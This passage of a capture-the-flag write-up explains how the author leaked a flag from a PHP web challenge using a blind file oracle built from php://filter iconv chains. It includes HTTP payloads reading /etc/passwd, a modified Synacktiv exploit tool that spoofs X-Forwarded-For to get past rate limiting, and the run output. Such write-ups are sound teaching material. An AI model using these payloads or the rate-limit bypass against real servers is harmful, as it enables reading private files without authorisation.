$config = json_decode($config, TRUE);
$config = $config[0];

// ESTABLISH DB FILE NAME
$dbFileName = $config["database_file_name"];

// CHECK IF FILE EXISTS
if (!(file_exists($dbFileName)))
{
    try
    {
        fopen($dbFileName, "w");
    }
    catch(Exception $f)
    {
        die(push_error("Database file \"$dbFileName\" could not be created! invalid permissions?"));
    }
}
[...]
```

So, we can just view the database file!

**When I was stucking at this stage during the CTF, I was lucky to find something like this:**
```shell
┌[siunam♥Mercury]-(~/ctf/0xL4ugh-CTF-2024/Web/Ghazy-Corp)-[2024.02.11|23:11:35(HKT)]
└> curl -s http://20.55.48.101/requests.json | jq
[
  {
    "ip": "ocydwmvcgz",
    "time": "2024-02-11 15:10:14",
    "user-agent": "python-requests/2.31.0"
  },
  {
    "ip": "bbwszqcjcs",
    "time": "2024-02-11 15:10:14",
    "user-agent": "python-requests/2.31.0"
  },
  {
    "ip": "wijfyhfncw",
    "time": "2024-02-11 15:10:15",
    "user-agent": "python-requests/2.31.0"
  },
  {
    "ip": "mkktsaywtq",
    "time": "2024-02-11 15:10:15",
    "user-agent": "python-requests/2.31.0"
  },
  [...]
```

Wait... Why people are brute forcing `/user_photo.php`???

And then, my brain suddenly clicked! Maybe people are **trying to leak the flag file's content through brute forcing**!

**I then Googled "php file_get_contents leak file" and found this:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211231537.png)

**In [this research post from Assetnote](https://www.assetnote.io/resources/research/leaking-file-contents-with-a-blind-file-oracle-in-flarum), it talked about this:**

> First revealed in the DownUnderCTF 2022, there is a technique for leaking the contents of arbitrary files using the `php://` wrapper even if the output of the file read is not given to the user. [...] In summary, this attack hinges on two features of the `php://filter` wrapper.

Hmm... In our case, the output of the flag file read is not returned, because it doesn't have the PNG magic bytes.

That being said, let's **leak the flag file content with blind file oracles**!

> Note: For more explanation behind this technique, you can [read the research post](https://www.assetnote.io/resources/research/leaking-file-contents-with-a-blind-file-oracle-in-flarum) or a [blog post written by Synacktiv](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle). 

- First, we need to **determine the oracle**:

In PHP `php://filter` wrapper, it supports converting a string's character encoding to another using the [`convert.iconv` function](https://www.php.net/manual/en/function.iconv.php). An example can be seen in below:

```php
php://filter/convert.iconv.latin1.UTF-32/resource=/etc/passwd
```

The above example will read the contents of `/etc/passwd`, and convert it from the `latin1` charset to `UTF-32`.

In this case, assume the first line of `/etc/passwd` is like this:

```
root:x:0:0:root:/root:/usr/bin/zsh
```

Then it'll be converted to:

```
From latin1:
root:x:0:0:root:/root:/usr/bin/zsh

To UTF-32:
r\0\0\0o\0\0\0o\0\0\0t\0\0\0:\0\0\0x\0\0\0:\0\0\00\0\0\0:\0\0\00\0\0\0:\0\0\0r\0\0\0o\0\0\0o\0\0\0t\0\0\0:\0\0\0/\0\0\0r\0\0\0o\0\0\0o\0\0\0t\0\0\0:\0\0\0/\0\0\0u\0\0\0s\0\0\0r\0\0\0/\0\0\0b\0\0\0i\0\0\0n\0\0\0/\0\0\0z\0\0\0s\0\0\0h\0\0\0
```

As you can see, the output is 4 times bigger than before the conversion. This is because UTF-32 will encode each character with a fixed 4 bytes.

Now, what if we keep repeat the conversion? Like from the `latin1` charset to `UTF-32`, to `UTF-32`, to `UTF-32`, and so on.

Turns out, **the string will grow so large that it'll exceed the memory limit and cause the PHP process to stop and return HTTP status code 500**! However, if the file that we point to is empty or doesn't exist, the PHP process won't stop and no HTTP status code 500.

Hence, we can utilize that as an oracle to test!

Let's try this!

**8 filter chains:**
```http
POST /user_photo.php HTTP/1.1
Host: 20.55.48.101

img=php://filter/convert.latin1|convert.iconv.latin1.UTF-32|convert.iconv.latin1.UTF-32|convert.iconv.latin1.UTF-32|convert.iconv.latin1.UTF-32|convert.iconv.latin1.UTF-32|convert.iconv.latin1.UTF-32|convert.iconv.latin1.UTF-32/resource=/etc/passwd
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240212135850.png)

**9 filter chains:**
```http
POST /user_photo.php HTTP/1.1
Host: 20.55.48.101

img=php://filter/convert.latin1|convert.iconv.latin1.UTF-32|convert.iconv.latin1.UTF-32|convert.iconv.latin1.UTF-32|convert.iconv.latin1.UTF-32|convert.iconv.latin1.UTF-32|convert.iconv.latin1.UTF-32|convert.iconv.latin1.UTF-32|convert.iconv.latin1.UTF-32/resource=/etc/passwd
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240212135903.png)

Hmm... No HTTP status code 500... But! **The "Not Allow" output is gone when we have 9 filter chains**!

**This is because the if else statement after `file_get_contents()` is stopped processing!**
```php
if(!empty($_POST['img']))
{
    $name=$_POST['img'];
    $content=file_get_contents($name);
    if(bin2hex(substr($content,1,3))==="504e47") // PNG magic bytes
    {
        echo "<img src=data:base64,".base64_encode($content);
    }
    else
    {
        echo "Not allowed";
    }
}
```

Now that we found the oracle, let's move on!

- Secondly, leak the flag with **`dechunk` filter**:

So basically, in PHP, there's another filter called `dechunk`. This filter was intended for parsing HTTP chunks. However, people also found the following findings:

- If the string is a single line and begins with one of the hexadecimal number (`0-9a-fA-F`), the whole line is removed;
- Otherwise, the string remains untouched.

Hmm... That's interesting, because base64 encoding character set is similar to hexadecimal number.

So, maybe we can leak the content of a file via:

- Base64 encode the file using the `convert.base64-encode` function;
- Apply the dechunk filter;
- Blow up (Exceed the memory limit) the string multiple times using a `latin1` to `UTF-32` conversion.
- If we don't get "Not allowed" response output, the file contents in base64 encoding is started with one of the hexadecimal number. Otherwise, it's not started with hexadecimal number, like `g-zG-Z`.

Unfortunately the full details of leaking the file content is far, far more complicated. If you're interested, you can dive deeper to it from the [blog post written by Synacktiv](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle).

Although the research post has linked the original DownUnderCTF 2022 challenge’s [solution script](https://github.com/DownUnderCTF/Challenges_2022_Public/blob/main/web/minimal-php/solve/solution.py), **I found that the Synacktiv's [php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit) tool is much better**.

**Let's download the tool!**
```shell
┌[siunam♥Mercury]-(/opt)-[2024.02.12|14:15:54(HKT)]
└> git clone https://github.com/synacktiv/php_filter_chains_oracle_exploit.git
Cloning into 'php_filter_chains_oracle_exploit'...
remote: Enumerating objects: 61, done.
remote: Counting objects: 100% (61/61), done.
remote: Compressing objects: 100% (38/38), done.
remote: Total 61 (delta 25), reused 49 (delta 13), pack-reused 0
Receiving objects: 100% (61/61), 13.71 KiB | 2.74 MiB/s, done.
Resolving deltas: 100% (25/25), done.
┌[siunam♥Mercury]-(/opt)-[2024.02.12|14:15:58(HKT)]
└> cd php_filter_chains_oracle_exploit 
┌[siunam♥Mercury]-(/opt/php_filter_chains_oracle_exploit)-[2024.02.12|14:16:32(HKT)]-[git://main ✔]
└> python3 filters_chain_oracle_exploit.py --help
usage: filters_chain_oracle_exploit.py [-h] --target TARGET --file FILE --parameter PARAMETER
                                       [--data DATA] [--headers HEADERS] [--verb VERB]
                                       [--proxy PROXY] [--in_chain IN_CHAIN]
                                       [--time_based_attack TIME_BASED_ATTACK] [--delay DELAY]

        Oracle error based file leaker based on PHP filters.
        Author of the tool : @_remsio_
        Trick firstly discovered by : @hash_kitten
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        $ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0   
        [*] The following URL is targeted : http://127.0.0.1
        [*] The following local file is leaked : /test
        [*] Running POST requests
        [+] File /test leak is finished!
        b'SGVsbG8gZnJvbSBTeW5hY2t0aXYncyBibG9ncG9zdCEK'
        b"Hello from Synacktiv's blogpost!\n"
        

options:
  -h, --help            show this help message and exit
  --target TARGET       URL on which you want to run the exploit.
  --file FILE           Path to the file you want to leak.
  --parameter PARAMETER
                        Parameter to exploit.
  --data DATA           Additionnal data that might be required. (ex : {"string":"value"})
  --headers HEADERS     Headers used by the request. (ex : {"Authorization":"Bearer [TOKEN]"})
  --verb VERB           HTTP verb to use POST(default),GET(~ 135 chars by default),PUT,DELETE
  --proxy PROXY         Proxy you would like to use to run the exploit. (ex : http://127.0.0.1:8080)
  --in_chain IN_CHAIN   Useful to bypass weak strpos configurations, adds the string in the chain. (ex : KEYWORD)
  --time_based_attack TIME_BASED_ATTACK
                        Exploits the oracle as a time base attack, can be improved. (ex : True)
  --delay DELAY         Set the delay in second between each request. (ex : 1, 0.1)
```

But! Before we fire up the script, let's take a step back.

**In a while ago, we found that the oracle is not HTTP status code 500, it's the "Not Allow" response output. So, we'll need to modify the script `core/requestor.py`'s function `error_oracle()`:**
```python
[...]
    def error_oracle(self, s):
        requ = self.req_with_response(s)
        if self.time_based_attack:
            return requ.elapsed.total_seconds() > ((self.time_based_attack/2)+0.01)
        
        isSuccess = True if 'Not allowed' not in requ.text else False
        return isSuccess
        # return requ.status_code == 500
```

**Then, since we'll also need to bypass the rate limiting, and the page requires our PHP session cookie, let's modify function `req_with_response()`:**
```python
[...]
import random
import string
[...]
    def req_with_response(self, s):
        if self.delay > 0:
            time.sleep(self.delay)
        data = {
            self.parameter: f'php://filter/{s}{self.in_chain}/resource={self.file_to_leak}'
        }
        merged_data = {key: value for (key, value) in (data.items() | self.data.items())}
        try:
            if self.verb == Verb.GET:
                requ = self.session.get(self.target, params=merged_data)
                return requ
            elif self.verb == Verb.PUT:
                requ = self.session.put(self.target, data=merged_data)
                return requ
            elif self.verb == Verb.DELETE:
                requ = self.session.delete(self.target, data=merged_data)
                return requ
            elif self.verb == Verb.POST:
                # bypass rate limiting
                header = {
                    'Cookie': 'PHPSESSID=<YOUR_OWN_PHP_SESSION_COOKIE_VALUE>',
                    'X-Forwarded-For': ''.join(random.choice(string.ascii_lowercase) for i in range(10))
                }

                requ = self.session.post(self.target, data=merged_data, headers=header)
                return requ
        except requests.exceptions.ConnectionError :
            print("[-] Could not instantiate a connection")
            exit(1)
        return None
[...]
```

**Finally, we can fire up the tool and leak the flag contents!**
```shell
┌[siunam♥Mercury]-(/opt/php_filter_chains_oracle_exploit)-[2024.02.12|14:27:38(HKT)]-[git://main ✗]
└> python3 filters_chain_oracle_exploit.py --target http://20.55.48.101/user_photo.php --file '/flag.txt' --parameter img
[*] The following URL is targeted : http://20.55.48.101/user_photo.php
[*] The following local file is leaked : /flag.txt
[*] Running POST requests
b'MHhMNHVnaHtBaGhoaGhfSG9wM19VX0RpZF8hdF9ieV9UaDNfSW50ZW5kZWRfV0BAeX0K'
b'0xL4ugh{Ahhhhh_Hop3_U_Did_!t_by_Th3_Intended_W@@y}\n'
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/leak_flag.gif)

> Yes, this is a GIF image, it's slowly leaking it XD

- **Flag: `0xL4ugh{Ahhhhh_Hop3_U_Did_!t_by_Th3_Intended_W@@y}`**

## Conclusion

What we've learned:

1. Mass Assignment vulnerability
2. Rate limiting bypass
3. Blind file oracle with PHP filter chains